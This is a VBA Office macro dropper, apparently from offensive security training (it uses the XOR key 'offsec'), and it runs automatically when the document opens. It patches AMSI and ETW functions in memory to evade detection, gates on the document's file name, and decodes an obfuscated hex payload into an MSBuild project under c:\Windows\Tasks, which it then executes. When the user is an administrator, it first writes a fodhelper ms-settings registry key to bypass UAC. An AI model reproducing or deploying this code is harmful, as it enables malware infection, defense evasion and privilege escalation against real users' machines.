	CQUYk = CQUYk & "0D4B534A32202A0F211B0B4C3A0815160F050D3317100C0808544D6D6E544B4B584A48544B4B584A48544B4B586D6E6B74747F3112203B17064A104013191B090C54604B351C0B1317082605130517082C12160F0C07601238220E0A1B1B15484B3422163820194D2E0516054F4B484E48130707064E482B0D17281616464108060F54545B4F583112203B1706503E0F190E5F63736A707183746F6B74707E716F6B74191B161B220D4B0C1C1B0F62707E716F6B20707E6D6E544B4B584A48544B20584A48544B707E4A48544B4B583D43567071584A48544B4B544F25050708526D6E544B4B585E51400C1A1D60736A4B4B544F3B21140D1936"
	CQUYk = CQUYk & "0721125D837464453B1921140B11175D8374736A
End Function





Function e_tw
	Dim et_w_bytes(0 To 7) As Byte
	et_w_bytes(0) = &H48
	et_w_bytes(1) = &H33
	et_w_bytes(2) = &HC0
	et_w_bytes(3) = &HC3
	et_w_bytes(4) = &H00
	et_w_bytes(5) = &H00
	et_w_bytes(6) = &H00
	Dim et_w_note_reg_address As LongPtr
		Dim etw_wpm_return As Long
		Dim etw_number_bytes_written As LongPtr
	Dim et_w_note_handle_address As LongPtr
	Dim et_w_ev_write_address As LongPtr
	Dim et_w_ev_write_full_address As LongPtr
	#if Win64 then
	et_w_note_reg_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwNotificationRegister")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_note_reg_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_note_handle_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventRegister")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_note_handle_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_ev_write_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_ev_write_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_ev_write_full_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_ev_write_full_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	#Else
		et_w_bytes(0) = &H31
		et_w_bytes(1) = &HC0
		et_w_bytes(2) = &HC3
		et_w_bytes(3) = &H00
	et_w_note_reg_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwNotificationRegister")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_note_reg_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_note_handle_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventRegister")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_note_handle_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_ev_write_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_ev_write_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	et_w_ev_write_full_address = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull")
		etw_wpm_return = WriteProcessMemory(&HFFFFFFFF, (et_w_ev_write_full_address), VarPtr(et_w_bytes(0)), 8, VarPtr(etw_number_bytes_written))
	#End If
End Function

Function RegWriteFodHelper(ByVal fod_str As String)
	Dim HKEY_CURRENT_USER As LongPtr
	Dim HKCU_Handle As LongPtr
	Dim desired_access As LongPtr
	Dim sub_key As String
	Dim reg_open_key_return As Long

	HKEY_CURRENT_USER = &H80000001
	HKCU_Handle = 0 
	desired_access = &H20019
	sub_key = ""
	reg_open_key_return = RegOpenKeyExA(HKEY_CURRENT_USER, sub_key , 0, desired_access, HKCU_Handle)

	Dim reg_create_key_return As Long
	Dim key_name As String
	Dim REG_SZ As Long
	Dim REG_EXPAND_SZ As Long
	Dim key_value As String
	Dim key_value_size As Long
	REG_SZ = &H00000002
	REG_EXPAND_SZ = &H00000004
	sub_key = "Software\Classes\ms-settings\shell\open\command"
	Dim reg_ex_value As String
	reg_ex_value = fod_str
	key_value = reg_ex_value
	key_value_size = len(reg_ex_value)
	reg_create_key_return = RegSetKeyValueA(HKCU_Handle, sub_key, key_name, REG_SZ, key_value, key_value_size)
	key_name = "DelegateExecute"
	key_value = ""
	key_value_size = 0
	reg_create_key_return = RegSetKeyValueA(HKCU_Handle, sub_key, key_name, REG_SZ, key_value, key_value_size)
	Dim str As String
	Dim fod_helper_path As String

	fod_helper_path = "C:\Windows\SysNative\cmd.exe /c ""cd C:\Windows\SysNative\" & "&& cmd /c start fodhelper.exe"""
	Shell fod_helper_path, vbHide
End Function

Function MyMacro()
	Dim fls_return As Long
	Dim fls_call_back As LongPtr
	fls_return = FlsAlloc(fls_call_back)

	If IsNull(fls_return) Then
		Exit Function
	End If
	If ActiveDocument.Name <> Decrypt("078073058053058059060061051105116104") Then
		Exit Function
	End If
	
	Dim amsi_address As LongPtr
	amsi_address = GetProcAddress(GetModuleHandleA("amsi.dll"), "AmsiOpenSession")
		Dim patch_bytes(0 To 3) As Byte
		patch_bytes(0) = &H48
		patch_bytes(1) = &H31
		patch_bytes(2) = &HC0
		Dim wpm_return As Long
		Dim number_bytes_written As LongPtr
	#if Win64 then
		wpm_return = WriteProcessMemory(&HFFFFFFFF, (amsi_address), VarPtr(patch_bytes(0)), 3, VarPtr(number_bytes_written))
		wpm_return = WriteProcessMemory(&HFFFFFFFF, (amsi_address + 5), VarPtr(patch_bytes(0)), 3, VarPtr(number_bytes_written))
	#else
		wpm_return = WriteProcessMemory((&HFFFFFFFF), (amsi_address+ 8), VarPtr(patch_bytes(1)), (2), number_bytes_written)
		wpm_return = WriteProcessMemory((&HFFFFFFFF), (amsi_address+ 15), VarPtr(patch_bytes(1)), (2), number_bytes_written)
	#end if

	e_tw
	poQrVM
	dhLPQBL
	LNsCF




	Dim index_counter As Long
	Dim buffer_string_length As Long
	Dim buffer_string_length2 As Long
	Dim a As Long
	Dim b As Long
	Dim buf() As Byte
	Dim byte_as_string As String

	index_counter = 1
	buffer_string_length = len(CQUYk)
	ReDim buf(0 To buffer_string_length/2) As Byte

	For a = index_counter To buffer_string_length
		byte_as_string = Mid(CQUYk, a, 2)
		buf(b) = Val("&H" & byte_as_string )
		a = a + 1
		b = b + 1
	Next a


	For i = 0 To UBound(buf)
		buf(i) = (buf(i) - 5) and &HFF
	Next i

	Dim key As String
	key = "offsec"
	Dim key_bytes() As Byte
	key_bytes = StrConv(key, vbFromUnicode)
	For k = 0 To UBound(buf)
		buf(k) = ((buf(k) Xor key_bytes(k Mod len(key)) ))
	Next k

	Dim full_path_exe As String
	full_path_exe = "c:\Windows\Tasks\test.exe"
	Dim full_path_msbuild As String
	full_path_exe_msbuild = "c:\Windows\Tasks\MsBuild.csproj"
	Dim file_number2 As Integer: file_number2 = FreeFile
	Open full_path_exe_msbuild For Binary Access Read Write As #file_number2
	Dim j As Long
	For j = 0 To UBound(buf)
		If buf(j) < 127 Then
			Put #file_number2, , buf(j)
		End If
	Next j
	Close #file_number2
	Dim msbuild_bypass_cmd As String
	Dim admin_num As LongPtr
	admin_num = IsUserAnAdmin()
	If admin_num = 1 Then
	msbuild_bypass_cmd = "cmd.exe /c ""cd c:\Windows\Tasks" & " && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Msbuild.exe MsBuild.csproj""
	RegWriteFodHelper(msbuild_bypass_cmd)
	End If
	If admin_num = 0 Then
	msbuild_bypass_cmd = "C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Msbuild.exe MsBuild.csproj"
		Chdir "c:\Windows\Tasks"
	Shell msbuild_bypass_cmd, vbHide
	End If
End Function


Sub SubstitutePage()
End Sub

Sub Document_Open()
	SubstitutePage
	MyMacro
End Sub

Sub AutoOpen()
	SubstitutePage
	MyMacro
End Sub

Sub AutoExec()
	SubstitutePage
	MyMacro
End Sub
Sub Auto_Open()
	SubstitutePage
	AutoOpen
End Sub

